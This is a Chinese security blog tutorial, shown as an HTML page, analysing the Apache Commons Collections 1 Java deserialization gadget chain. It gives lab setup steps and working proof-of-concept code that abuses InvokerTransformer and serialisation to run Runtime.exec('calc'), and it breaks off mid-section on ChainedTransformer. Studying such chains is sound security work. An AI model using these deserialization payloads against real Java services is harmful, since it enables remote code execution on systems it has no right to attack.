<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="0x00 前言前面的几篇文章中，我们学习了java反射机制、RMI、动态代理以及java反序列化的流程，这些内容其实涉及的只是一些前置知识，不过也是比较关键的一些知识，能够为我们接下来分析各种漏洞以及利用链做好铺垫（网上很多文章都是直接从利用链开始谈起，对于我这样的新手太不友好）。从本篇文章开始，我将分析各种漏洞的利用链。 0x01 什么是利用链？什么是CC链用p神的话：利⽤链也叫“gadget">
<meta property="og:type" content="article">
<meta property="og:title" content="Commons Collections 1 利用链">
<meta property="og:url" content="https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
<meta property="og:site_name" content="杰同学的自留地">
<meta property="og:description" content="0x00 前言前面的几篇文章中，我们学习了java反射机制、RMI、动态代理以及java反序列化的流程，这些内容其实涉及的只是一些前置知识，不过也是比较关键的一些知识，能够为我们接下来分析各种漏洞以及利用链做好铺垫（网上很多文章都是直接从利用链开始谈起，对于我这样的新手太不友好）。从本篇文章开始，我将分析各种漏洞的利用链。 0x01 什么是利用链？什么是CC链用p神的话：利⽤链也叫“gadget">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121131507555.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132227719.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132825129.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132935038.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121142730581.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121143308832.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121151826101.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121152106929.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121152737069.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121162933292.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121163506413.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121163937101.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121164539714.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121171552950.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20210731232549977.png">
<meta property="article:published_time" content="2024-01-20T16:38:06.000Z">
<meta property="article:modified_time" content="2025-04-03T04:51:46.659Z">
<meta property="article:author" content="anch0r">
<meta property="article:tag" content="利用链">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121131507555.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Commons Collections 1 利用链</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
  <!-- Waline Comments -->
  
    <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/>
  
<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/01/23/URLDNS%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/01/16/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&text=Commons Collections 1 利用链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=Commons Collections 1 利用链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Commons Collections 1 利用链&body=Check out this article: https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&title=Commons Collections 1 利用链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&name=Commons Collections 1 利用链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.anch0r.top/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/&t=Commons Collections 1 利用链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9F%E4%BB%80%E4%B9%88%E6%98%AFCC%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">0x01 什么是利用链？什么是CC链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x03 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">4.1.</span> <span class="toc-text">前置知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-InvokerTransformer"><span class="toc-number">4.2.</span> <span class="toc-text">1. InvokerTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ChainedTransformer"><span class="toc-number">4.3.</span> <span class="toc-text">2.ChainedTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ConstantTransformer-%E7%B1%BB"><span class="toc-number">4.4.</span> <span class="toc-text">3. ConstantTransformer 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-TransformedMap%E7%B1%BB"><span class="toc-number">4.5.</span> <span class="toc-text">4 TransformedMap类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#put"><span class="toc-number">4.5.1.</span> <span class="toc-text">put()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checkSetValue"><span class="toc-number">4.5.2.</span> <span class="toc-text">checkSetValue()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-AnotationInvocationHandler%E7%B1%BB"><span class="toc-number">4.6.</span> <span class="toc-text">5. AnotationInvocationHandler类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x04 小结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Commons Collections 1 利用链
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">anch0r</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-01-20T16:38:06.000Z" class="dt-published" itemprop="datePublished">2024-01-21</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E5%88%A9%E7%94%A8%E9%93%BE/" rel="tag">利用链</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面的几篇文章中，我们学习了java反射机制、RMI、动态代理以及java反序列化的流程，这些内容其实涉及的只是一些前置知识，不过也是比较关键的一些知识，能够为我们接下来分析各种漏洞以及利用链做好铺垫（网上很多文章都是直接从利用链开始谈起，对于我这样的新手太不友好）。从本篇文章开始，我将分析各种漏洞的利用链。</p>
<h2 id="0x01-什么是利用链？什么是CC链"><a href="#0x01-什么是利用链？什么是CC链" class="headerlink" title="0x01 什么是利用链？什么是CC链"></a>0x01 什么是利用链？什么是CC链</h2><p>用p神的话：利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将 gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能 是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了。（之前我有学习过php反序列化的pop链，也正如这样描述的，以后有机会写篇文章分享一下）。</p>
<p>CC链作为java反序列化利用链的一种，是我们在学习java反序列化过程中不可跳过的一关。这里的CC是对Apache Commons Collections这个java第三方库的简称，它在java中提供了一些功能，可以更方便的管理Collection集合，因为方便，Commons Collections被广泛用于各种Java应用的开发，它提供很多强有力的数据结构类型，并且实现了各种集合工具类。其中反序列化漏洞就出现在这个库中，这意味着使用<strong>该库的漏洞版本</strong>的Java应用会面临<strong>反序列化漏洞</strong>的威胁。而我们的目的，就是研究这个库是如何产生并被利用反序列化漏洞的。</p>
<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>对于利用链这块，网上文章很少有讲环境搭建的，导致我环境搭建就花了好长时间。。。</p>
<p>首先是环境要求：</p>
<ol>
<li><p>jdk1.7版本，这里我下载的是这个安装包：<a target="_blank" rel="noopener" href="https://download.oracle.com/otn/java/jdk/7u80-b15/jdk-7u80-windows-x64.exe">jdk-7u80-windows-x64.exe</a></p>
</li>
<li><p>本文要研究的CC链：<a target="_blank" rel="noopener" href="http://archive.apache.org/dist/commons/collections/binaries/">apache commons collection 3.1版本</a></p>
</li>
<li><p>IntelliJ IDEA</p>
</li>
</ol>
<p>准备好后，在IDEA里新建一个项目，选择安装好的jdk1.7。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121131507555.png" alt="新建项目"></p>
<p>然后进入<code>文件-&gt;项目结果-&gt;模块</code>,在创建好的项目下选择<code>依赖</code>，点击<code>+</code>号，然后选择<code>1 JAR或目录……</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132227719.png" alt="进入依赖"></p>
<p>接着就是选择下载并解压好的commons collection 3.1文件夹下的jar包：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132825129.png" alt="导入CC jar包"></p>
<p>导入后，就可以在项目的外部库中看到这个CC jar包了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132935038.png" alt="jar包成功导入"></p>
<h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><p>前面介绍Commons Collections时说过，这个包提供很多强有力的数据结构类型，并且实现了各种集合工具类，其中我们需要关注的一个功能是：</p>
<blockquote>
<p>Transforming decorators that alter each object as it is added to the collection</p>
<p>转化装饰器：修改每一个添加到collection中的object</p>
</blockquote>
<p>在Commons Collections包中实现了一个TransformedMap类(<code>org.apache.commons.collections.map.TransformedMap</code>)，该类是对Java标准数据结构Map接口的一个扩展，该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p>
<p><code>org.apache.commons.collections.Transformer</code>这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。</p>
<p>包括TransfomedMap在内，我们在构造利用链时要用到如下Class：</p>
<ol>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>TransformedMap</li>
<li>AnotationInvocationHandler</li>
</ol>
<p>我们现在的目的就是执行<code>Runtime.getRuntime().exec("calc");</code>语句</p>
<p>那我们按照顺序一一来看。</p>
<h3 id="1-InvokerTransformer"><a href="#1-InvokerTransformer" class="headerlink" title="1. InvokerTransformer"></a>1. InvokerTransformer</h3><p>该类位于<code>org.apache.commons.collections.functors</code>中，我们重点看其中的transform方法（只看重点部分）：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            } <span class="comment">//省略</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>在该方法中，显示通过<code>input</code>的<code>getClass()</code>方法获得Class对象，然后获取Class中的<code>method(this.iMethodName, this.iParamTypes)</code>，再<code>method.invoke(input, this.iArgs)</code>触发方法。那么我们是否可以控制这些变量来完成一个反射呢？</p>
<p>InvokerTransformer有两个构造方法，其中一个可以让我们传入以上需要用到的<code>iMethodName,iParamTypes,iArgs</code>,即方法名、参数类型和参数本身</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> {</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>那么我们可以通过传入恶意的一些参数，从而利用反射达到RCE的效果，比如我们构造如下RCE：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建invokerTransformer，并利用其构造函数对其成员变量iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>});</span><br><span class="line">        <span class="comment">// 构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>).getDeclaredMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>), <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 执行payload</span></span><br><span class="line">        invokerTransformer.transform(input);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>成功弹出计算器：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121142730581.png" alt="成功弹出计算器"></p>
<p>虽然成功RCE，但这还远没有接近真实场景，下面我们模拟一下客户端和服务器之间序列化和反序列化的过程（为了简便，客户端和服务端我就写到一个类里了）：</p>
<blockquote>
<p>需要注意的是，InvokerTransformer类实现了Serializable接口，所以该类是可以序列化的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121143308832.png" alt="InvokerTransformer实现了Serializable接口"></p>
</blockquote>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>});</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化，将构造的恶意类实例写入到payload.bin文件中</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(invokerTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并执行payload</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>).getDeclaredMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//执行payload</span></span><br><span class="line">        inv.transform(input);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>运行后一样成功弹出计算器。</p>
<p>如果我们直接利用这处反射机制作为漏洞的话，则需要服务端的开发人员“帮助”我们做以下事情才能触发漏洞：</p>
<ul>
<li>把反序列化后的Object强制转化为InvokerTransformer类型</li>
<li>构造Input - Runtime实例</li>
<li>刻意执行InvokerTransformer中的transform方法，并将Runtime实例以方法参数传入。</li>
</ul>
<p>实际中会有开发人员这么好心帮我们把这些都实现了吗？显然不会（除非开发人员自己人，hh）</p>
<p>所以现在我们就面临一些问题：</p>
<p>payload肯定要在客户端刻意自定义构造，再传输进入服务端</p>
<p>服务端需要把我们输入exp反序列化成一个在代码中可能使用的类，并且在代码正常操作中会调用这个类中的一个可出触发漏洞的函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行），如果这个反序列化的类和这个类触发命令执行的方法课可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！</p>
<p>所以接下来我们就一个一个解决上述问题，首先是客户端自定义payload，即input参数的问题，这时要用到下面这个类。</p>
<h3 id="2-ChainedTransformer"><a href="#2-ChainedTransformer" class="headerlink" title="2.ChainedTransformer"></a>2.ChainedTransformer</h3><p>该类同样也位于<code>org.apache.commons.collections.functors</code>包中，使用它我们就可以自己来写input参数，自定义payload</p>
<p>在ChainedTransformer类中，也有一个transform方法，我们定位到它的源码：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) {</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    